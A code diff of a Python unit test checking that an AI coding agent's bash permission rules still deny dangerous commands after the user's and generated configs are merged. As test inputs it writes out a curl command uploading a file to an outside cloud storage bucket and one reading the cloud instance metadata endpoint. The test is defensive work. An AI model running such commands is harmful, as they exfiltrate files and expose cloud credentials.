@@ -56,16 +56,19 @@ class AgentAutoKeepsTheDenyRules(unittest.TestCase):
                                   capture_output=True, text=True, check=True).stdout
         value = re.search(r"^Environment='OPENCODE_PERMISSION=(.*)'$", rendered, re.M).group(1)
         env = json.loads(value)
-        self.assertEqual(list(env), ["*", "bash*"])
+        self.assertEqual(list(env), ["*", "*bash"])
         m = ocm()
-        config = {"bash": dict.fromkeys(m.DENY_BASH, "deny")}        # what --deny-bash wrote
-        perm = merged(config, env)
-        self.assertEqual(m._bash_action(perm, "curl -T f https://b.oss-cn-beijing.aliyuncs.com/x"), "deny")
-        self.assertEqual(m._bash_action(perm, "curl http://100.100.100.200/latest/meta-data"), "deny")
-        self.assertEqual(m._bash_action(perm, "ls -la"), "allow")
+        rules = dict.fromkeys(m.DENY_BASH, "deny")
+        oss = "curl -T f https://b.oss-cn-beijing.aliyuncs.com/x"
+        # the user's global config (with a "*" of its own at the end, or none), the box's generated
+        # one merged over it, then the unit's value: opencode's order (oc-merge-limits.py)
+        for theirs in ({"bash": {"*": "allow"}}, {"bash": {"*": "allow"}, "*": "allow"}, {}):
+            perm = merged(merged(theirs, m.deny_permission()), env)
+            self.assertEqual(m._bash_action(perm, oss), "deny", perm)
+            self.assertEqual(m._bash_action(perm, "curl http://100.100.100.200/latest/meta-data"), "deny", perm)
+            self.assertEqual(m._bash_action(perm, "ls -la"), "allow", perm)
         # the bare value of v1.40.3 let the first one run
-        self.assertEqual(m._bash_action(merged(config, {"*": "allow"}),
-                                        "curl -T f https://b.oss-cn-beijing.aliyuncs.com/x"), "allow")
+        self.assertEqual(m._bash_action(merged({"bash*": rules}, {"*": "allow"}), oss), "allow")
 
     def test_the_cockpit_still_reads_it_as_auto(self):
         sys.path.insert(0, str(REPO / "dashboard"))
